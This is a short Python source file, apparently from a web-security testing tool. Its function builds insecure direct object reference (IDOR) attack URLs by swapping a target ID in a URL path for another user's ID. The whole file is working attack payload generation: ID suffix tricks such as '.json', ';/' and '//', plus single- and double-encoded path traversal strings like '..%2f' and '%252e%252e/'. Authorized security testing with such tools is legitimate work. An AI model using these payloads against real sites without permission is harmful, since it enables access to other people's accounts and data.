from urllib.parse import urlsplit


def build_idor(url, target_id, second_id):
    if not target_id or not second_id or "/" in second_id or "\\" in second_id:
        return {"techniques": "IDOR", "payload": []}

    parts = urlsplit(url)
    segments = parts.path.split("/")
    matches = [i for i, segment in enumerate(segments) if segment == target_id]

    if len(matches) != 1:
        return {"techniques": "IDOR", "payload": []}

    index = matches[0]
    prefix = "/".join(segments[:index + 1])
    suffix = "/".join(segments[index + 1:])

    idor_payloads = {
        "normal": ["{sid}", "{sid}/", "{sid}//", "{sid}/.", "{sid}/..", "{sid};", "{sid};/",
                   "{sid}.json", "{sid}.xml", "{sid}.txt", "{sid}#fakeaccount"],

        "traversal_1": ["../{sid}", "..\\/{sid}", "..%2f{sid}", "..%5c{sid}", "..;/{sid}",
                        "%2e%2e/{sid}", "%252e%252e/{sid}"],

        "traversal_2": ["../../{parent}/{sid}", "..\\../{parent}/{sid}", "..%5c..%2f{parent}/{sid}",
                        "%2e%2e%2f%2e%2e/{parent}/{sid}",
                        "%252e%252e%252f%252e%252e/{parent}/{sid}"]
    }

    traversal_depth = {"traversal_1": 1, "traversal_2": 2}
    payloads = []

    for category, templates in idor_payloads.items():
        depth = traversal_depth.get(category)

        if depth is not None and index - 1 < depth:
            continue

        for template in templates:
            if category == "normal":
                new_path = "/".join(
                    segments[:index] +
                    [template.format(sid=second_id)] +
                    segments[index + 1:]
                )
            else:
                values = {"sid": second_id}

                if category == "traversal_2":
                    values["parent"] = segments[index - 1]

                new_path = prefix + "/" + template.format(**values)

                if suffix:
                    new_path += "/" + suffix

            payloads.append(f"{parts.scheme}://{parts.netloc}{new_path}")

    return {"techniques": "IDOR", "payload": payloads, "location": "url",}